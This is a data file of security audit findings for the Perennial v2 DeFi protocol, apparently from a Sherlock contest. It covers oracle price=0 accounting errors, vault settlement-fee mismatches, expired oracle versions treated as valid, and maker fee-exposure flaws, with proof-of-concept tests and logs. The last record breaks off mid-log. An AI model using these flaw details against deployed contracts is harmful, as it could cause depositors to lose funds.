nameчseverityчfunctionчdescriptionчrecommendationчimpact
Empty orders do not request from oracle and during settlement they use an invalid oracle version with `price=0` which messes up a lot of fees and funding accounting leading to loss of funds for the makersчhighч```\n// request version\nif (!newOrder.isEmpty()) oracle.request(IMarket(this), account);\n```\nч"When `market.update` which doesn't change user's position is called, a new (current) global order is created, but the oracle version is not requested due to empty order. This means that during the order settlement, it will use non-existant invalid oracle version with `price = 0`. This price is then used to accumulate all the data in this invalid `Version`, meaning accounting is done using `price = 0`, which is totally incorrect. For instance, all funding and fees calculations multiply by oracle version's price, thus all time periods between empty order and the next valid oracle version will not accumulate any fees, which is funds usually lost by makers (as makers won't receive fees/funding for the risk they take).\nWhen `market.update` is called, it requests a new oracle version at the current order's timestamp unless the order is empty:\n```\n// request version\nif (!newOrder.isEmpty()) oracle.request(IMarket(this), account);\n```\n\nThe order is empty when it doesn't modify user position:\n```\nfunction isEmpty(Order memory self) internal pure returns (bool) {\n    return pos(self).isZero() && neg(self).isZero();\n}\n\nfunction pos(Order memory self) internal pure returns (UFixed6) {\n    return self.makerPos.add(self.longPos).add(self.shortPos);\n}\n\nfunction neg(Order memory self) internal pure returns (UFixed6) {\n    return self.makerNeg.add(self.longNeg).add(self.shortNeg);\n}\n```\n\nLater, when a valid oracle version is commited, during the settlement process, oracle version at the position is used:\n```\nfunction _processOrderGlobal(\n    Context memory context,\n    SettlementContext memory settlementContext,\n    uint256 newOrderId,\n    Order memory newOrder\n) private {\n    // @audit no oracle version at this timestamp, thus it's invalid with `price=0`\n    OracleVersion memory oracleVersion = oracle.at(newOrder.timestamp); \n\n    context.pending.global.sub(newOrder);\n    // @audit order is invalidated (it's already empty anyway), but the `price=0` is still used everywhere\n    if (!oracleVersion.valid) newOrder.invalidate();\n\n    VersionAccumulationResult memory accumulationResult;\n    (settlementContext.latestVersion, context.global, accumulationResult) = VersionLib.accumulate(\n        settlementContext.latestVersion,\n        context.global,\n        context.latestPosition.global,\n        newOrder,\n        settlementContext.orderOracleVersion,\n        oracleVersion, // @audit <<< when oracleVersion is invalid, the `price=0` will still be used here\n        context.marketParameter,\n        context.riskParameter\n    );\n// rest of code\n```\n\nIf the oracle version is invalid, the order is invalidated, but the `price=0` is still used to accumulate. It doesn't affect pnl from price move, because the final oracle version is always valid, thus the correct price is used to evaluate all possible account actions, however it does affect accumulated fees and funding:\n```\nfunction _accumulateLinearFee(\n    Version memory next,\n    AccumulationContext memory context,\n    VersionAccumulationResult memory result\n) private pure {\n    (UFixed6 makerLinearFee, UFixed6 makerSubtractiveFee) = _accumulateSubtractiveFee(\n        context.riskParameter.makerFee.linear(\n            Fixed6Lib.from(context.order.makerTotal()),\n            context.toOracleVersion.price.abs() // @audit <<< price == 0 for invalid oracle version\n        ),\n        context.order.makerTotal(),\n        context.order.makerReferral,\n        next.makerLinearFee\n    );\n// rest of code\n    // Compute long-short funding rate\n    Fixed6 funding = context.global.pAccumulator.accumulate(\n        context.riskParameter.pController,\n        toSkew.unsafeDiv(Fixed6Lib.from(context.riskParameter.takerFee.scale)).min(Fixed6Lib.ONE).max(Fixed6Lib.NEG_ONE),\n        context.fromOracleVersion.timestamp,\n        context.toOracleVersion.timestamp,\n        context.fromPosition.takerSocialized().mul(context.fromOracleVersion.price.abs()) // @audit <<< price == 0 for invalid oracle version\n    );\n// rest of code\nfunction _accumulateInterest(\n    Version memory next,\n    AccumulationContext memory context\n) private pure returns (Fixed6 interestMaker, Fixed6 interestLong, Fixed6 interestShort, UFixed6 interestFee) {\n    // @audit price = 0 and notional = 0 for invalid oracle version\n    UFixed6 notional = context.fromPosition.long.add(context.fromPosition.short).min(context.fromPosition.maker).mul(context.fromOracleVersion.price.abs());\n// rest of code\n```\n\nAs can be seen, all funding and fees accumulations multiply by oracle version's price (which is 0), thus during these time intervals fees and funding are 0.\nThis will happen by itself during any period when there are no orders, because oracle provider's settlement callback uses `market.update` with empty order to settle user account, thus any non-empty order is always followed by an empty order for the next version and `price = 0` will be used to settle it until the next non-empty order:\n```\nfunction _settle(IMarket market, address account) private {\n    market.update(account, UFixed6Lib.MAX, UFixed6Lib.MAX, UFixed6Lib.MAX, Fixed6Lib.ZERO, false);\n}\n```\n\nThe scenario above is demonstrated in the test, add this to test/unit/market/Market.test.ts:\n```\nit('no fees accumulation due to invalid version with price = 0', async () => {\n\nfunction setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n    const oracleVersion = {\n    price: parse6decimal(price),\n    timestamp: timestamp,\n    valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n    oracle.status.returns([oracleVersion, nextTimestamp])\n    oracle.request.returns()\n}\n\nfunction setupOracleAt(price: string, valid : boolean, timestamp : number) {\n    const oracleVersion = {\n    price: parse6decimal(price),\n    timestamp: timestamp,\n    valid: valid,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n}\n\nconst riskParameter = { // rest of code(await market.riskParameter()) }\nconst riskParameterMakerFee = { // rest of coderiskParameter.makerFee }\nriskParameterMakerFee.linearFee = parse6decimal('0.005')\nriskParameterMakerFee.proportionalFee = parse6decimal('0.0025')\nriskParameterMakerFee.adiabaticFee = parse6decimal('0.01')\nriskParameter.makerFee = riskParameterMakerFee\nconst riskParameterTakerFee = { // rest of coderiskParameter.takerFee }\nriskParameterTakerFee.linearFee = parse6decimal('0.005')\nriskParameterTakerFee.proportionalFee = parse6decimal('0.0025')\nriskParameterTakerFee.adiabaticFee = parse6decimal('0.01')\nriskParameter.takerFee = riskParameterTakerFee\nawait market.connect(owner).updateRiskParameter(riskParameter)\n\ndsu.transferFrom.whenCalledWith(user.address, market.address, COLLATERAL.mul(1e12)).returns(true)\ndsu.transferFrom.whenCalledWith(userB.address, market.address, COLLATERAL.mul(1e12)).returns(true)\n\nsetupOracle('100', TIMESTAMP, TIMESTAMP + 100);\n\nawait market\n    .connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, COLLATERAL, false);\nawait market\n    .connect(userB)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, POSITION, 0, COLLATERAL, false);\n\nsetupOracle('100', TIMESTAMP + 100, TIMESTAMP + 200);\nawait market\n    .connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, 0, false);\n\n// oracle is commited at timestamp+200\nsetupOracle('100', TIMESTAMP + 200, TIMESTAMP + 300);\nawait market\n    .connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, 0, false);\n\n// oracle is not commited at timestamp+300\nsetupOracle('100', TIMESTAMP + 200, TIMESTAMP + 400);\nsetupOracleAt('0', false, TIMESTAMP + 300);\nawait market\n    .connect(user)\n    ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, 0, false);\n\n// settle to see makerValue at all versions\nsetupOracle('100', TIMESTAMP + 400, TIMESTAMP + 500);\n\nawait market.settle(user.address);\nawait market.settle(userB.address);\n\nvar ver = await market.versions(TIMESTAMP + 200);\nconsole.log(""version 200: longValue: "" + ver.longValue + "" makerValue: "" + ver.makerValue);\nvar ver = await market.versions(TIMESTAMP + 300);\nconsole.log(""version 300: longValue: "" + ver.longValue + "" makerValue: "" + ver.makerValue);\nvar ver = await market.versions(TIMESTAMP + 400);\nconsole.log(""version 400: longValue: "" + ver.longValue + "" makerValue: "" + ver.makerValue);\n})\n```\n\nConsole log:\n```\nversion 200: longValue: -318 makerValue: 285\nversion 300: longValue: -100000637 makerValue: 100500571\nversion 400: longValue: -637 makerValue: 571\n```\n\nNotice, that fees are accumulated between versions 200 and 300, version 300 has huge pnl (because it's evaluated at price = 0), which then returns to normal at version 400, but no fees are accumulated between version 300 and 400 due to version 300 having `price = 0`.\nCode Snippet\nTool used\nManual Review"чKeep the price from the previous valid oracle version and use it instead of oracle version's one if oracle version's price == 0.\nDiscussion\nsherlock-admin2\n1 comment(s) were left on this issue during the judging contest.\npanprog commented:\ninvalid by sherlock rules\nnevillehuang\n@panprog What is your comment referring to here?\npanprog\n@nevillehuang The comment was meant for issue #7, somehow got mixed up with this one. This issue is valid.\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/301чAll fees and funding are incorrectly calculated as 0 during any period when there are no non-empty orders (which will be substantially more than 50% of the time, more like 90% of the time). Since most fees and funding are received by makers as a compensation for their price risk, this means makers will lose all these under-calculated fees and will receive a lot less fees and funding than expected.
Vault global shares and assets change will mismatch local shares and assets change during settlement due to incorrect `_withoutSettlementFeeGlobal` formulaчhighч```\nfunction update(\n    Account memory self,\n    uint256 currentId,\n    UFixed6 assets,\n    UFixed6 shares,\n    UFixed6 deposit,\n    UFixed6 redemption\n) internal pure {\n    self.current = currentId;\n    // @audit global account will have less assets and shares than sum of local accounts\n    (self.assets, self.shares) = (self.assets.sub(assets), self.shares.sub(shares));\n    (self.deposit, self.redemption) = (self.deposit.add(deposit), self.redemption.add(redemption));\n}\n```\nчEvery vault update, which involves change of position in the underlying markets, `settlementFee` is charged by the Market. Since many users can deposit and redeem during the same oracle version, this `settlementFee` is shared equally between all users of the same oracle version. However, there is an issue in that `settlementFee` is charged once both for deposits and redeems, however `_withoutSettlementFeeGlobal` subtracts `settlementFee` in full both for deposits and redeems, meaning that for global fee, it's basically subtracted twice (once for deposits, and another time for redeems). But for local fee, it's subtracted proportional to `checkpoint.orders`, with sum of fee subtracted equal to exactly `settlementFee` (once). This difference in global and local `settlementFee` calculations leads to inflated `shares` and `assets` added for user deposits (local state) compared to vault overall (global state).\nHere is an easy scenario to demonstrate the issue:\nSettlementFee = `$10`\nUser1 deposits `$10` for oracle version `t = 100`\nUser2 redeems `10 shares` (worth $10) for the same oracle version `t = 100` (checkpoint.orders = 2)\nOnce the oracle version `t = 100` settles, we have the following: 4.1. Global deposits = `$10`, redeems = `$10` 4.2. Global deposits convert to `0 shares` (because `_withoutSettlementFeeGlobal(10)` applies `settlementFee` of `$10` in full, returning 10-10=0) 4.3. Global redeems convert to `0 assets` (because `_withoutSettlementFeeGlobal(10)` applies `settlementFee` of `$10` in full, returning 10-10=0) 4.4. User1 deposit of `$10` converts to `5 shares` (because `_withoutSettlementFeeLocal(10)` applies `settlementFee` of `$5` (because there are 2 orders), returning 10-5=5) 4.5. User2 redeem of `10 shares` converts to `$5` (for the same reason)\nFrom the example above it can be seen that:\nUser1 receives 5 shares, but global vault shares didn't increase. Over time this difference will keep growing potentially leading to a situation where many user redeems will lead to 0 global shares, but many users will still have local shares which they will be unable to redeem due to underflow, thus losing funds.\nUser2's assets which he can claim increase by $5, but global claimable assets didn't change, meaning User2 will be unable to claim assets due to underflow when trying to decrease global assets, leading to loss of funds for User2.\nThe underflow in both cases will happen in `Vault._update` when trying to update global account:\n```\nfunction update(\n    Account memory self,\n    uint256 currentId,\n    UFixed6 assets,\n    UFixed6 shares,\n    UFixed6 deposit,\n    UFixed6 redemption\n) internal pure {\n    self.current = currentId;\n    // @audit global account will have less assets and shares than sum of local accounts\n    (self.assets, self.shares) = (self.assets.sub(assets), self.shares.sub(shares));\n    (self.deposit, self.redemption) = (self.deposit.add(deposit), self.redemption.add(redemption));\n}\n```\nчCalculate total orders to deposit and total orders to redeem (in addition to total orders overall). Then `settlementFee` should be multiplied by `deposit/orders` for `toGlobalShares` and by `redeems/orders` for `toGlobalAssets`. This weightening of `settlementFee` will make it in-line with local order weights.\nDiscussion\nsherlock-admin4\nThe protocol team fixed this issue in the following PRs/commits: https://github.com/equilibria-xyz/perennial-v2/pull/305чAny time there are both deposits and redeems in the same oracle version, the users receive more (local) shares and assets than overall vault shares and assets increase (global). This mismatch causes:\nSystematic increase of (sum of user shares - global shares), which can lead to bank run since the last users who try to redeem will be unable to do so due to underflow.\nSystematic increase of (sum of user assets - global assets), which will lead to users being unable to claim their redeemed assets due to underflow.\nThe total difference in local and global `shares+assets` equals to `settlementFee` per each oracle version with both deposits and redeems. This can add up to significant amounts (at `settlementFee` = $1 this can be $100-$1000 per day), meaning it will quickly become visible especially for point 2., because typically global claimable assets are at or near 0 most of the time, since users usually redeem and then immediately claim, thus any difference of global and local assets will quickly lead to users being unable to claim.\nCode Snippet\nTool used\nManual Review
Requested oracle versions, which have expired, must return this oracle version as invalid, but they return it as a normal version with previous version's price insteadчhighч```\nfunction _commitRequested(OracleVersion memory version) private returns (bool) {\n    if (block.timestamp <= (next() + timeout)) {\n        if (!version.valid) revert KeeperOracleInvalidPriceError();\n        _prices[version.timestamp] = version.price;\n    } else {\n        // @audit previous valid version's price is set for expired version\n        _prices[version.timestamp] = _prices[_global.latestVersion]; \n    }\n    _global.latestIndex++;\n    return true;\n}\n```\nчEach market action requests a new oracle version which must be commited by the keepers. However, if keepers are unable to commit requested version's price (for example, no price is available at the time interval, network or keepers are down), then after a certain timeout this oracle version will be commited as invalid, using the previous valid version's price.\nThe issue is that when this expired oracle version is used by the market (using oracle.at), the version returned will be valid (valid = true), because oracle returns version as invalid only if `price = 0`, but the `commit` function sets the previous version's price for these, thus it's not 0.\nThis leads to market using invalid versions as if they're valid, keeping the orders (instead of invalidating them), which is a broken core functionality and a security risk for the protocol.\nWhen requested oracle version is commited, but is expired (commited after a certain timeout), the price of the previous valid version is set to this expired oracle version:\n```\nfunction _commitRequested(OracleVersion memory version) private returns (bool) {\n    if (block.timestamp <= (next() + timeout)) {\n        if (!version.valid) revert KeeperOracleInvalidPriceError();\n        _prices[version.timestamp] = version.price;\n    } else {\n        // @audit previous valid version's price is set for expired version\n        _prices[version.timestamp] = _prices[_global.latestVersion]; \n    }\n    _global.latestIndex++;\n    return true;\n}\n```\n\nLater, `Market._processOrderGlobal` reads the oracle version using the `oracle.at`, invalidating the order if the version is invalid:\n```\nfunction _processOrderGlobal(\n    Context memory context,\n    SettlementContext memory settlementContext,\n    uint256 newOrderId,\n    Order memory newOrder\n) private {\n    OracleVersion memory oracleVersion = oracle.at(newOrder.timestamp);\n\n    context.pending.global.sub(newOrder);\n    if (!oracleVersion.valid) newOrder.invalidate();\n```\n\nHowever, expired oracle version will return `valid = true`, because this flag is only set to `false` if price = 0:\n```\nfunction at(uint256 timestamp) public view returns (OracleVersion memory oracleVersion) {\n    (oracleVersion.timestamp, oracleVersion.price) = (timestamp, _prices[timestamp]);\n    oracleVersion.valid = !oracleVersion.price.isZero(); // @audit <<< valid = false only if price = 0\n}\n```\n\nThis means that `_processOrderGlobal` will treat this expired oracle version as valid and won't invalidate the order.ч
When vault's market weight is set to 0 to remove the market from the vault, vault's leverage in this market is immediately set to max leverage risking position liquidationчmediumч```\n    marketCollateral = marketContext.margin\n        .add(collateral.sub(totalMargin).mul(marketContext.registration.weight));\n\n    UFixed6 marketAssets = assets\n        .mul(marketContext.registration.weight)\n        .min(marketCollateral.mul(LEVERAGE_BUFFER));\n```\nч"If any market has to be removed from the vault, the only way to do this is via setting this market's weight to 0. The problem is that the first vault rebalance will immediately withdraw max possible collateral from this market, leaving vault's leverage at max possible leverage, risking the vault's position liquidation. This is especially dangerous if vault's position in this removed market can not be closed due to high skew, so min position is not 0, but the leverage will be at max possible value. As a result, vault depositors can lose funds due to liquidation of vault's position in this market.\nWhen vault is rebalanced, each market's collateral is calculated as following:\n```\n    marketCollateral = marketContext.margin\n        .add(collateral.sub(totalMargin).mul(marketContext.registration.weight));\n\n    UFixed6 marketAssets = assets\n        .mul(marketContext.registration.weight)\n        .min(marketCollateral.mul(LEVERAGE_BUFFER));\n```\n\nFor removed markets (weight = 0), `marketCollateral` will be set to `marketContext.margin` (i.e. minimum valid collateral to have position at max leverage), `marketAssets` will be set to 0. But later the position will be adjusted in case minPosition is not 0:\n```\n    target.position = marketAssets\n        .muldiv(marketContext.registration.leverage, marketContext.latestPrice.abs())\n        .max(marketContext.minPosition)\n        .min(marketContext.maxPosition);\n```\n\nThis means that vault's position in the market with weight 0 will be at max leverage until liquidated or position can be closed.\nThe scenario above is demonstrated in the test, change the following test in test/integration/vault/Vault.test.ts:\n```\n    it('simple deposits and redemptions', async () => {\n// rest of code\n      // Now we should have opened positions.\n      // The positions should be equal to (smallDeposit + largeDeposit) * leverage originalOraclePrice.\n      expect(await position()).to.equal(\n        smallDeposit.add(largeDeposit).mul(leverage).mul(4).div(5).div(originalOraclePrice),\n      )\n      expect(await btcPosition()).to.equal(\n        smallDeposit.add(largeDeposit).mul(leverage).div(5).div(btcOriginalOraclePrice),\n      )\n\n      /*** remove all lines after this and replace with the following code: ***/\n\n      console.log(""pos1 = "" + (await position()) + "" pos2 = "" + (await btcPosition()) + "" col1 = "" + (await collateralInVault()) + "" col2 = "" + (await btcCollateralInVault()));\n\n      // update weight\n      await vault.connect(owner).updateWeights([parse6decimal('1.0'), parse6decimal('0')])\n\n      // do small withdrawal to trigger rebalance\n      await vault.connect(user).update(user.address, 0, smallDeposit, 0)\n      await updateOracle()\n\n      console.log(""pos1 = "" + (await position()) + "" pos2 = "" + (await btcPosition()) + "" col1 = "" + (await collateralInVault()) + "" col2 = "" + (await btcCollateralInVault()));\n    })\n```\n\nConsole log:\n```\npos1 = 12224846 pos2 = 206187 col1 = 8008000000 col2 = 2002000000\npos1 = 12224846 pos2 = 206187 col1 = 9209203452 col2 = 800796548\n```\n\nNotice, that after rebalance, position in the removed market (pos2) is still the same, but the collateral (col2) reduced to minimum allowed.\nCode Snippet\nTool used\nManual Review"чEnsure that the market's collateral is based on leverage even if `weight = 0`\nDiscussion\narjun-io\nWe would likely consider this a low for two reason:\nThe admin has control over when the vault is set to 0 weight, so as long as the limits don't prevent the vault from fully closing the position this is a safe operation to perform\nThe liquidation fee would be an acceptable cost in the cases when the above doesn't apply (i.e. in an emergency)\nnevillehuang\n@panprog Do you agree with the above explanation by sponsor?\npanprog\n@nevillehuang @arjun-io The issue is that it's not just a liquidation, it's that the vault will be bricked most of the time while that market's collateral is below margin and above maintenance (due to #23), i.e.:\nMarket's min margin for position is $10. When the weight is 0, market collateral will be set to $10 exactly\nThe following version's price is slightly against the maker, so market's collateral is now $9.999\nAny vault action will first try to settle (by calling market.update) and since it's below margin, it will revert.\nSo until the position is liquidated or back above margin - the vault is bricked. It happens both due to this issue and to #23, so this issue is different from #23, but their combination causes this impact.\nIf the position is back above margin, next vault action will put it back at exactly margin, so the probability of vault bricking is very high and it can be for extended time.\nSo for all these considerations I still think it's medium.\narjun-io\nI see, the confluence with #23 does cause some further issues. Due to the admin's ability to control this weighting I think it's less of an issue but I will defer to the judge\npanprog\nI believe that sherlock's rules towards admin issues is that if admin does some valid action, but the consequences are unexpected and cause some bad impact (loss of funds / breaking core functionality), then the issue is valid. Here the admin sets weight to 0 in expectation that the market is removed from the vault. Ok, maybe he's aware that collateral will be at min margin and OK with the liquidation fee in such case. But I highly doubt that in such case admin is aware that the vault will be bricked temporarily (which is breaking the core functionality). Note, that in such case admin can not do anything to resume vault operation, because setting weight back to non-0 will revert since it tries to rebalance at the start of this function. That's why I think it's valid medium.\narjun-io\nIn that case, I agree a medium is appropriateчMarket removed from the vault (weight set to 0) is put at max leverage and has a high risk of being liquidated, thus losing vault depositors funds.
Makers can lose funds from price movement even when no long and short positions are opened, due to incorrect distribution of adiabatic fees exposure between makersчmediumч"```\nit('adiabatic fee', async () => {\n  function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n    const oracleVersion = {\n      price: parse6decimal(price),\n      timestamp: timestamp,\n      valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n    oracle.status.returns([oracleVersion, nextTimestamp])\n    oracle.request.returns()\n  }\n\n  async function showInfo() {\n    await market.settle(user.address);\n    await market.settle(userB.address);\n    await market.settle(userC.address);\n    var sum : BigNumber = BigNumber.from('0');\n    var info = await market.locals(user.address);\n    console.log(""user collateral = "" + info.collateral);\n    sum = sum.add(info.collateral);\n    var info = await market.locals(userB.address);\n    sum = sum.add(info.collateral);\n    console.log(""userB collateral = "" + info.collateral);\n    var info = await market.locals(userC.address);\n    sum = sum.add(info.collateral);\n  }\n\n  async function showVer(ver : number) {\n    var v = await market.versions(ver);\n    console.log(""ver"" + ver + "": makerValue="" + v.makerValue + "" longValue="" + v.longValue + \n    "" makerPosFee="" + v.makerPosFee + "" makerNegFee="" + v.makerNegFee +\n    "" takerPosFee="" + v.takerPosFee + "" takerNegFee="" + v.takerNegFee\n    );\n  }\n\n  const riskParameter = { // rest of code(await market.riskParameter()) }\n  const riskParameterMakerFee = { // rest of coderiskParameter.makerFee }\n  riskParameterMakerFee.linearFee = parse6decimal('0.00')\n  riskParameterMakerFee.proportionalFee = parse6decimal('0.00')\n  riskParameterMakerFee.adiabaticFee = parse6decimal('0.01')\n  riskParameterMakerFee.scale = parse6decimal('50.0')\n  riskParameter.makerFee = riskParameterMakerFee\n  const riskParameterTakerFee = { // rest of coderiskParameter.takerFee }\n  riskParameterTakerFee.linearFee = parse6decimal('0.00')\n  riskParameterTakerFee.proportionalFee = parse6decimal('0.00')\n  riskParameterTakerFee.adiabaticFee = parse6decimal('0.01')\n  riskParameterTakerFee.scale = parse6decimal('50.0')\n  riskParameter.takerFee = riskParameterTakerFee\n  await market.connect(owner).updateRiskParameter(riskParameter)\n\n  marketParameter = {\n    fundingFee: parse6decimal('0.0'),\n    interestFee: parse6decimal('0.0'),\n    oracleFee: parse6decimal('0.0'),\n    riskFee: parse6decimal('0.0'),\n    positionFee: parse6decimal('0.0'),\n    maxPendingGlobal: 5,\n    maxPendingLocal: 3,\n    settlementFee: 0,\n    makerCloseAlways: false,\n    takerCloseAlways: false,\n    closed: false,\n    settle: false,\n  }\n  await market.connect(owner).updateParameter(beneficiary.address, coordinator.address, marketParameter)\n\n  var time = TIMESTAMP;\n\n  setupOracle('1', time, time + 100);\n  await market.connect(user)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, COLLATERAL, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('1', time, time + 100);\n  await market.connect(userB)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, POSITION, 0, 0, COLLATERAL, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('1', time, time + 100);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('2', time, time + 100);\n  await market.connect(userB)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, 0, 0, 0, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('2', time, time + 100);\n  await market.connect(user)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, 0, 0, 0, 0, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('0.5', time, time + 100);\n  await showInfo()\n  await showVer(time)\n})\n```\n"ч"Adiabatic fees introduced in this new update of the protocol (v2.3) were introduced to solve the problem of adiabatic fees netting out to 0 in market token's rather than in USD terms. With the new versions, this problem is solved and adiabatic fees now net out to 0 in USD terms. However, they net out to 0 only for the whole makers pool, but each individual maker can have profit or loss from adiabatic fees at different price levels all else being equal. This creates unexpected risk of loss of funds from adiabatic fees for individual makers, which can be significant, up to several percents of the amount invested.\nThe issue is demonstrated in the following scenario:\n`price = 1`\nAlice open `maker = 10` (collateral = +0.9 from adiabatic fee)\nBob opens `maker = 10` (collateral = +0.7 from adiabatic fee)\nPath A. `price = 1`. Bob closes (final collateral = +0), Alice closes (final collaterral = +0)\nPath B. `price = 2`. Bob closes (final collateral = +0.1), Alice closes (final collaterral = -0.1)\nPath C. `price = 0.5`. Bob closes (final collateral = -0.05), Alice closes (final collateral = +0.05)\nNotice that both Alice and Bob are the only makers, there are 0 longs and 0 shorts, but still both Alice and Bob pnl depends on the market price due to pnl from adiabatic fees. Adiabatic fees net out to 0 for all makers aggregated (Alice + Bob), but not for individual makers. Individual makers pnl from adiabatic fees is more or less random depending on the other makers who have opened.\nIf Alice were the only maker, then:\nprice = 1\nAlice opens `maker = 10` (collateral = +0.9)\nprice = 2: exposure adjusted +0.9 (Alice collateral = +1.8)\nAlice closes `maker = 10` (adiabatic fees = `-1.8`, Alice final collateral = 0)\nFor the lone maker there is no such problem, final collateral is 0 regardless of price. The core of the issue lies in the fact that the maker's adiabatic fees exposure adjustment is weighted by makers open maker amount. So in the first example:\nprice = 1. Alice `maker = 10, exposure = +0.9`, Bob `maker = 10, exposure = +0.7`\nprice = 2. Total exposure is adjusted by +1.6, split evenly between Alice and Bob (+0.8 for each)\nAlice new exposure = 0.9 + 0.8 = +1.7 (but adiabatic fees paid to close = -1.8)\nBob new exposure = 0.7 + 0.8 = +1.5 (but adiabatic fees paid to close = -1.4)\nIf maker exposure adjustment was weighted by individual makers exposure, then all is correct:\nprice = 1. Alice `maker = 10, exposure = +0.9`, Bob `maker = 10, exposure = +0.7`\nprice = 2. Total exposure is adjusted by +1.6, split 0.9:0.7 between Alice and Bob, e.g. +0.9 for Alice, +0.7 for Bob\nAlice new exposure = 0.9 + 0.9 = +1.8 (adiabatic fees paid to close = -1.8, net out to 0)\nBob new exposure = 0.7 + 0.7 = +1.4 (adiabatic fees paid to close = -1.4, net out to 0)\nIn the worst case, in the example above, if Bob opens `maker = 40` (adiabatic fees scale = 50), then at `price = 2`, Alice's final collateral is `-0.4` due to adiabatic fees. Given that Alice's position is 10 at `price = 2` (notional = 20), a loss of `-0.4` is a loss of `-2%` at 1x leverage, which is quite significant.\nThe scenario above is demonstrated in the test, change the following test in test/unit/market/Market.test.ts:\n```\nit('adiabatic fee', async () => {\n  function setupOracle(price: string, timestamp : number, nextTimestamp : number) {\n    const oracleVersion = {\n      price: parse6decimal(price),\n      timestamp: timestamp,\n      valid: true,\n    }\n    oracle.at.whenCalledWith(oracleVersion.timestamp).returns(oracleVersion)\n    oracle.status.returns([oracleVersion, nextTimestamp])\n    oracle.request.returns()\n  }\n\n  async function showInfo() {\n    await market.settle(user.address);\n    await market.settle(userB.address);\n    await market.settle(userC.address);\n    var sum : BigNumber = BigNumber.from('0');\n    var info = await market.locals(user.address);\n    console.log(""user collateral = "" + info.collateral);\n    sum = sum.add(info.collateral);\n    var info = await market.locals(userB.address);\n    sum = sum.add(info.collateral);\n    console.log(""userB collateral = "" + info.collateral);\n    var info = await market.locals(userC.address);\n    sum = sum.add(info.collateral);\n  }\n\n  async function showVer(ver : number) {\n    var v = await market.versions(ver);\n    console.log(""ver"" + ver + "": makerValue="" + v.makerValue + "" longValue="" + v.longValue + \n    "" makerPosFee="" + v.makerPosFee + "" makerNegFee="" + v.makerNegFee +\n    "" takerPosFee="" + v.takerPosFee + "" takerNegFee="" + v.takerNegFee\n    );\n  }\n\n  const riskParameter = { // rest of code(await market.riskParameter()) }\n  const riskParameterMakerFee = { // rest of coderiskParameter.makerFee }\n  riskParameterMakerFee.linearFee = parse6decimal('0.00')\n  riskParameterMakerFee.proportionalFee = parse6decimal('0.00')\n  riskParameterMakerFee.adiabaticFee = parse6decimal('0.01')\n  riskParameterMakerFee.scale = parse6decimal('50.0')\n  riskParameter.makerFee = riskParameterMakerFee\n  const riskParameterTakerFee = { // rest of coderiskParameter.takerFee }\n  riskParameterTakerFee.linearFee = parse6decimal('0.00')\n  riskParameterTakerFee.proportionalFee = parse6decimal('0.00')\n  riskParameterTakerFee.adiabaticFee = parse6decimal('0.01')\n  riskParameterTakerFee.scale = parse6decimal('50.0')\n  riskParameter.takerFee = riskParameterTakerFee\n  await market.connect(owner).updateRiskParameter(riskParameter)\n\n  marketParameter = {\n    fundingFee: parse6decimal('0.0'),\n    interestFee: parse6decimal('0.0'),\n    oracleFee: parse6decimal('0.0'),\n    riskFee: parse6decimal('0.0'),\n    positionFee: parse6decimal('0.0'),\n    maxPendingGlobal: 5,\n    maxPendingLocal: 3,\n    settlementFee: 0,\n    makerCloseAlways: false,\n    takerCloseAlways: false,\n    closed: false,\n    settle: false,\n  }\n  await market.connect(owner).updateParameter(beneficiary.address, coordinator.address, marketParameter)\n\n  var time = TIMESTAMP;\n\n  setupOracle('1', time, time + 100);\n  await market.connect(user)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, POSITION, 0, 0, COLLATERAL, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('1', time, time + 100);\n  await market.connect(userB)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, POSITION, 0, 0, COLLATERAL, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('1', time, time + 100);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('2', time, time + 100);\n  await market.connect(userB)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](userB.address, 0, 0, 0, 0, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('2', time, time + 100);\n  await market.connect(user)\n      ['update(address,uint256,uint256,uint256,int256,bool)'](user.address, 0, 0, 0, 0, false);\n  await showInfo()\n  await showVer(time)\n\n  time += 100;\n  setupOracle('0.5', time, time + 100);\n  await showInfo()\n  await showVer(time)\n})\n```\n\nConsole log:\n```\nuser collateral = 10000000000\nuserB collateral = 0\nver1636401093: makerValue=0 longValue=0 makerPosFee=0 makerNegFee=0 takerPosFee=0 takerNegFee=0\nuser collateral = 10000090000\nuserB collateral = 10000000000\nver1636401193: makerValue=0 longValue=0 makerPosFee=9000 makerNegFee=0 takerPosFee=0 takerNegFee=0\nuser collateral = 10000090000\nuserB collateral = 10000070000\nver1636401293: makerValue=0 longValue=0 makerPosFee=7000 makerNegFee=0 takerPosFee=0 takerNegFee=0\nuser collateral = 10000170000\nuserB collateral = 10000150000\nver1636401393: makerValue=8000 longValue=0 makerPosFee=0 